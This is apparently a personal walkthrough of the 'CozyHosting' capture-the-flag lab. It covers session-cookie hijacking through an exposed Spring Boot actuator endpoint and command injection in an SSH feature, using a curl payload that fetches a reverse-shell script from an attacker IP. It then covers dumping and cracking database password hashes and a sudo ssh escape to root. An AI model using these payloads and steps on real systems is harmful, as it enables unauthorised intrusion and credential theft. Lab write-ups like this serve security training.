# CozyHosting

# Nmap scan

<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

# Site enumeration

Looking at the site it is hard to indentify what it is running but I rembered something from an ippsec video that helps me. You can identify services by the applications 404 page!!! This [resource ](https://0xdf.gitlab.io/cheatsheets/404)helps.

And it tells us its spring boot!

Doing some googling we can find typical spring boot end points with this [resource](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html).

And we find an interesting actuator endpoint. Looking around and we can find session for the kanderson with what seems to be a hash.

```
8FED324727395ED7BB4D3D7D9A904355
```

After some time wasted trying to crack this hash I realised it was a cookie and not a hash....

We can swap that with our current session and after I get in I find executessh is vulnerable to command injection i tried a lot of things to get a shell and finially did this&#x20;

```
0xdf;curl${IFS}http://10.10.16.5:8000/rev.sh${IFS}-o${IFS}/tmp/rev.sh
```

And we have a shell!

# Priv esc

Linpeas and sudo -l do not find anything of not but we do have a jar file

We can extact and search for passwords

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

And we find credentials for postgres, we can use this command to login.

```
PGPASSWORD='Vg&nvzAQ7XxR' psql -U postgres -h localhost
```

And we find hashes

```
kanderson:$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

And we can crack the hash...

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

We try to ssh as root but fail. Looking at the passwd file we see a user called josh and this password does work!!

Now as the josh user we run sudo -l and see we can run ssh as root!!

This [exploit ](https://gtfobins.github.io/gtfobins/ssh/#sudo)from GTFOBins gets us root in one line.

PWNNDDDD
